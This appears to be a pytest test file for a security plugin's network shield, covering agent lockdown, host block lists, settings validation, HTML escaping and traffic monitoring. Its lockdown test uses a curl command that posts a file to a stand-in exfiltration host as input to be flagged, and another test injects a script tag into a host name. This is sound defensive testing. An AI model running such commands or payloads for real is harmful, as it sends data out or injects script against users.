"""Network Shield, the public part (plugins/blackbox/shields/network) — the second shield.

Contracts: the setting refuses anything invalid and stores nothing then; lockdown judges only real
hosts (never a file name) and always lets an agent reach this machine and the local network; the
block list works without lockdown; findings count only while the shield is on. Without Blackbox
Desktop's add-on (Amos, 2026-11-21: the public plugin carries only what works without Desktop):
a first switch-on runs agent lockdown, the protections that need Desktop say so in Settings and on
the card (never "active"), and stories escape every outside value.
"""

from __future__ import annotations

from dataclasses import replace
from types import SimpleNamespace

import pytest

from plugins.blackbox import shields
from plugins.blackbox.shields import extensions
from plugins.blackbox.shields.network import helper, api, events, lockdown, mode as network_mode, monitor, status
from plugins.blackbox.shields.network.addresses import public_only
from plugins.blackbox.shields.network.monitor import nettop
from plugins.blackbox.shields.network.monitor.processes import ProcessTree, classify
from plugins.blackbox.shields.shield_api import AssistantAnswer, ShieldApiError, ShieldContext

NETWORK = shields.get("network-shield")


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("HOME", str(tmp_path))
    monkeypatch.setenv("BLACKBOX_HOME", str(tmp_path / "bb"))
    return tmp_path


def _on(**options):
    return network_mode.build(enabled=True, **options)


# ------------------------------------------------------------------ the setting


def test_without_the_helper_a_first_switch_on_runs_agent_lockdown():
    assert NETWORK is not None and NETWORK.mode().enabled is False
    assert network_mode.protections(network_mode.build(enabled=True)) == (network_mode.LOCKDOWN,)
    assert network_mode.protections(network_mode.build(enabled=False, protections=(network_mode.DNS,))) == ()


def test_settings_say_which_protections_need_the_system_protection_helper(tmp_path, monkeypatch):
    def states():
        protections = next(field for field in NETWORK.settings_fields() if field.key == network_mode.OPT_PROTECTIONS)
        return {option.id: option.status for option in protections.options}
    assert states() == {"dns": "needs-helper", "firewall": "needs-helper", "lockdown": "supported",
                        "cut": "needs-helper", "ssh-lockdown": "needs-helper"}
    installed = tmp_path / "ai.umanitek.blackbox.netd.plist"
    installed.write_text("<plist/>", encoding="utf-8")
    monkeypatch.setattr(helper, "LAUNCH_DAEMON", installed)   # the core installer (or Desktop) put it there
    assert set(states().values()) == {"supported"}
    assert network_mode.default_protections() == (network_mode.DNS,)


@pytest.mark.parametrize("section, error", [
    ({"enabled": "yes"}, "enabled must be true or false"),
    ({"protections": ["dns", "teleport"]}, "protections must be a list of"),
    ({"allow": ["not a host!"]}, "allow must be a list of up to 500"),
    ({"agent_hosts": ["x"] * 201}, "agent_hosts must be a list of up to 200"),
])
def test_an_invalid_save_is_refused_and_stores_nothing(section, error):
    shield_id, stored, errors = network_mode.validate({"shields": {"network-shield": section}})
    assert shield_id == "network-shield" and stored == {} and any(error in message for message in errors)


def test_a_valid_save_is_written_complete_and_normalised(monkeypatch):
    monkeypatch.setattr(network_mode, "current", lambda: network_mode.build())
    _, stored, errors = network_mode.validate({"shields": {"network-shield": {
        "enabled": True, "protections": ["dns", "lockdown"], "allow": ["Example.COM.", "203.0.113.4"]}}})
    assert errors == []
    assert stored["enabled"] is True and stored["protections"] == ["dns", "lockdown"]
    assert stored["allow"] == ["example.com", "203.0.113.4"]
    assert stored["agent_hosts"] == list(network_mode.DEFAULT_AGENT_HOSTS)   # kept from the current mode


# ------------------------------------------------------------------ lockdown


def test_file_names_are_never_hosts():
    hosts = lockdown.hosts_in({"command": "git clone https://github.com/a/project.git && cat config.json main.py"})
    assert hosts == ["github.com"]


def test_lockdown_refuses_unlisted_hosts_and_keeps_local_and_subdomains_reachable():
    locked = _on(protections=(network_mode.LOCKDOWN,))
    found = NETWORK.detect("terminal", {"command": "curl https://exfil.attacker-site.com/u -d @x"}, locked)
    assert [f.identifier for f in found] == [lockdown.LOCKDOWN_ID] and found[0].severity == "critical"
    for command in ("curl http://127.0.0.1:8080/x", "curl http://192.168.1.10/x", "pip download x --index https://files.pythonhosted.org/s",
                    "curl https://api.github.com/repos"):
        assert NETWORK.detect("terminal", {"command": command}, locked) == [], command


def test_the_block_list_needs_no_lockdown_and_allow_wins():
    found = NETWORK.detect("web_extract", {"urls": ["https://ads.bad-host.com/p"]}, _on(block=("bad-host.com",)))
    assert [f.identifier for f in found] == [lockdown.BLOCKED_ID]
    assert NETWORK.detect("web_extract", {"urls": ["https://ads.bad-host.com/p"]},
                          _on(block=("bad-host.com",), allow=("ads.bad-host.com",))) == []
    assert NETWORK.detect("web_extract", {"urls": ["https://ads.bad-host.com/p"]}, network_mode.build(block=("bad-host.com",))) == []


def test_findings_are_claimed_and_count_only_while_on():
    assert NETWORK.claims({"identifier": lockdown.LOCKDOWN_ID}) and not NETWORK.claims({"identifier": "secret:seed-phrase"})
    assert NETWORK.allows({}, _on()) and not NETWORK.allows({}, network_mode.build())


# ------------------------------------------------------------------ the card and the events


def test_the_card_needs_the_helper_and_never_says_active_on_the_setting_alone(tmp_path, monkeypatch):
    card = status.build(_on(protections=(network_mode.DNS, network_mode.LOCKDOWN)))
    assert [row.state for row in card.sections[0].rows] == ["needs-helper", "needs-helper", "active", "needs-helper", "needs-helper"]
    assert card.offer.kind == "get" and card.offer.title == "See everything with Blackbox Desktop"
    installed = tmp_path / "ai.umanitek.blackbox.netd.plist"
    installed.write_text("<plist/>", encoding="utf-8")
    monkeypatch.setattr(helper, "LAUNCH_DAEMON", installed)
    rows = status.build(_on(protections=(network_mode.DNS, network_mode.LOCKDOWN))).sections[0].rows
    assert rows[0].state == "waiting", "installed but not reporting: never active on the setting alone"
    assert rows[1].state == "off" and rows[2].state == "active"


def test_stories_escape_outside_values(monkeypatch):
    monkeypatch.setattr(events.audit, "read_findings", lambda limit: [
        {"identifier": lockdown.LOCKDOWN_ID, "fields": {"host": "<script>x</script>.com"}, "framework": "<b>agent</b>",
         "decision": "block", "ts": 1}])
    story = events.report()[0].story
    assert "<script>" not in story and "&lt;script&gt;" in story and "&lt;b&gt;agent" in story


# ------------------------------------------------------------------ Blackbox Desktop, offered


def test_switched_on_without_blackbox_desktop_the_card_offers_it_for_this_os():
    offer = status.build(_on()).offer
    assert offer.kind == "get" and "Blackbox Desktop" in offer.title and offer.items
    downloads = {d.os: d for d in offer.downloads}
    assert downloads["macos"].available and downloads["macos"].url.startswith("https://")
    # Launch-first (E2E 2026-11-21): a download that does not exist yet is not offered at all —
    # no "Windows — coming soon" button.
    assert set(downloads) == {"macos"} and all(d.available for d in offer.downloads)


def test_with_blackbox_desktops_add_on_the_card_opens_it_instead():
    shields.reload_registry()
    try:
        extensions.use(extensions.Registrar(provider_package=network_mode.DESKTOP_ADDON))
        offer = status.build(_on()).offer
        assert offer.kind == "open" and offer.open_url == network_mode.DESKTOP_OPEN_URL and not offer.downloads
    finally:
        shields.reload_registry()


# ------------------------------------------------------------------ the monitor and the system status (no special rights)


def _context(indicators=None):
    return ShieldContext(network_indicators=lambda: indicators,
                         ask_assistant=lambda message: AssistantAnswer(ok=True, answer="fine"))


def test_the_live_reads_refuse_while_the_shield_is_off(monkeypatch):
    monkeypatch.setattr(network_mode, "current", lambda: network_mode.build())
    for read in (api.connections, api.system_status):
        with pytest.raises(ShieldApiError) as refused:
            read(_context(), {})
        assert refused.value.status == 409
    assert api.overview(_context(), {})["graph"] == {"ready": False, "reachable": None, "keeping_last_lists": False,
                                                       "complete": False, "domains": 0, "ips": 0}


def test_a_graph_that_is_down_is_not_reported_ready_and_the_kept_lists_are_said(monkeypatch):
    """E2E recheck 2026-11-21: with the DKG node stopped the overview still said ready:true. The
    lists in hand are kept (DNS Shield and the firewall keep blocking) and the overview says so."""
    from plugins.blackbox.ruleset.live.network_lists import NetworkIndicators
    monkeypatch.setattr(network_mode, "current", lambda: network_mode.build(enabled=True))
    lists = NetworkIndicators(domains=frozenset({"bad.example"}), ips=frozenset(), assets=1, read=1, complete=True, built_at=1.0)
    down = ShieldContext(network_indicators=lambda: lists, graph_reachable=lambda: False,
                         ask_assistant=lambda message: AssistantAnswer(ok=True, answer="fine"))
    graph = api.overview(down, {})["graph"]
    assert graph["ready"] is False and graph["reachable"] is False and graph["keeping_last_lists"] is True
    assert graph["domains"] == 1
    up = ShieldContext(network_indicators=lambda: lists, graph_reachable=lambda: True,
                       ask_assistant=lambda message: AssistantAnswer(ok=True, answer="fine"))
    assert api.overview(up, {})["graph"]["ready"] is True


def test_only_public_addresses_from_the_graph_are_ever_marked():
    """FIX-0222: a threat list's private or CGNAT address names someone else's network."""
    assert public_only({"45.130.148.102", "192.168.54.1", "100.106.194.93", "169.254.169.254", "0.0.0.0", "not-an-ip"}) == {"45.130.148.102"}


NETTOP = """,bytes_in,bytes_out,
launchd.1,0,0,
tcp6 *.22<->*.*,,,
node.42,100,900,
tcp4 192.168.1.5:5000<->45.130.148.102:443,100,900,
Brave Browser H.7,50,60,
udp6 fe80::1%en0.5353<->2001:db8::1.443,10,20,
"""


def test_nettop_is_parsed_and_listening_sockets_are_left_out():
    processes = nettop.parse(NETTOP)
    assert [(p.name, p.pid) for p in processes] == [("node", 42), ("Brave Browser H", 7)]
    assert processes[1].connections[0].remote_ip == "2001:db8::1" and processes[1].connections[0].remote_port == 443


def test_children_of_an_agent_are_the_agents_and_blackbox_is_labelled():
    tree = ProcessTree.parse(" 10 1 0.0 100 /Users/me/.local/bin/claude\n 42 10 12,5 2048 node /usr/local/bin/npm i x\n"
                             " 30 1 0.0 1 node /Users/me/Library/Application Support/Blackbox/hermes/x/dkg start\n"
                             " 5 6 0.0 1 a\n 6 5 0.0 1 b\n")
    assert tree.agent_of(42) == "Claude Code" and tree.agent_of(30) == "" and tree.is_blackbox(30)
    assert tree.cpu[42] == 12.5 and tree.memory[42] == 2048 * 1024
    assert tree.agent_of(5) == "" and classify(["/Applications/Blackbox.app/Contents/Resources/engine/bin/hermes"]) == ""


def test_a_reading_flags_listed_addresses_and_works_out_rates(monkeypatch):
    monkeypatch.setattr(nettop, "available", lambda: None)
    monkeypatch.setattr(nettop, "read", lambda: nettop.parse(NETTOP))
    monkeypatch.setattr(ProcessTree, "read", classmethod(lambda cls: ProcessTree.parse(" 42 1 3.5 10 /usr/bin/codex\n")))
    monkeypatch.setattr(monitor, "_previous", {"at": 0.0, "bytes": {}})
    first = monitor.read(frozenset({"45.130.148.102"}))
    assert first.threats == 1 and first.processes[0].agent == "Codex" and first.processes[0].connections[0].threat
    assert first.processes[0].cpu == 3.5 and first.connections_out == 2 and first.connections_in == 0
    grown = replace(first.processes[0].connections[0], bytes_in=1100, bytes_out=900)
    later = monitor.with_rates([replace(first.processes[0], connections=(grown,))], first.taken_at + 2)
    assert later[0].rate_in == 500 and later[0].rate_out == 0 and later[0].connections[0].rate_in == 500


LOOPBACK = """,state,bytes_in,bytes_out,
python3.14.300,,9000500,9000500,
tcp4 127.0.0.1:61000<->127.0.0.1:7879,Established,9000000,9000000,
tcp4 192.168.1.5:5001<->140.82.112.3:443,Established,500,500,
oxigraph.301,,9000000,9000000,
tcp4 127.0.0.1:7879<->127.0.0.1:61000,Established,9000000,9000000,
tcp6 ::1.7000<->::1.61001,Established,0,0,
"""


def test_loopback_is_never_internet_traffic(monkeypatch):
    """Seen on Amos's screen: Download now and Upload now both 9.1 MB/s — this Mac's own services
    (python ↔ oxigraph on 127.0.0.1) were counted as internet, once at each end."""
    processes = nettop.parse(LOOPBACK)
    python, oxigraph = processes
    assert python.bytes_in == 500 and python.local_bytes_in == 9000000 and oxigraph.bytes_in == 0
    assert [c.local for c in python.connections] == [True, False] and all(c.local for c in oxigraph.connections)
    monkeypatch.setattr(monitor, "_previous", {"at": 0.0, "bytes": {}})
    monitor.with_rates(processes, 100.0)
    grow = lambda p, by: replace(p, connections=tuple(replace(c, bytes_in=c.bytes_in + by, bytes_out=c.bytes_out + by) for c in p.connections))
    rated = monitor.with_rates([grow(python, 1000), grow(oxigraph, 1000)], 101.0)
    assert [(p.rate_in, p.rate_out) for p in rated] == [(1000, 1000), (0, 0)]
    assert [(p.local_rate_in, p.local_rate_out) for p in rated] == [(1000, 1000), (2000, 2000)]


def test_system_status_works_out_rates_and_reports_no_battery_when_there_is_none(monkeypatch):
    from plugins.blackbox.shields.network import system

    counters = {"n": 0}

    def net(pernic=True):
        counters["n"] += 1
        grow = 1000 * counters["n"]
        return {"en0": SimpleNamespace(bytes_recv=grow * 3, bytes_sent=grow, packets_recv=1, packets_sent=1, errin=0, errout=0, dropin=0, dropout=0),
                "lo0": SimpleNamespace(bytes_recv=grow, bytes_sent=grow, packets_recv=1, packets_sent=1, errin=0, errout=0, dropin=0, dropout=0)}

    monkeypatch.setattr(system, "_previous", {"at": 0.0, "disk": None, "net": {}})
    monkeypatch.setattr(system.psutil, "net_io_counters", net)
    monkeypatch.setattr(system.psutil, "net_if_stats", lambda: {"en0": SimpleNamespace(isup=True, speed=1000), "lo0": SimpleNamespace(isup=True, speed=0)})
    monkeypatch.setattr(system.psutil, "disk_io_counters", lambda: SimpleNamespace(read_bytes=counters["n"] * 500, write_bytes=0))
    monkeypatch.setattr(system.psutil, "sensors_battery", lambda: None)
    first = system.reading(now=100.0)
    assert first["interfaces"][0]["rate_in"] == 0 and first["battery"] is None
    later = system.reading(now=102.0)
    en0, lo0 = later["interfaces"]
    assert (en0["name"], en0["rate_in"], en0["rate_out"], lo0["loopback"]) == ("en0", 1500, 500, True)
    assert later["disk_io"]["read"] == 250 and 0 <= later["memory"]["percent"] <= 100 and later["processes"] > 0
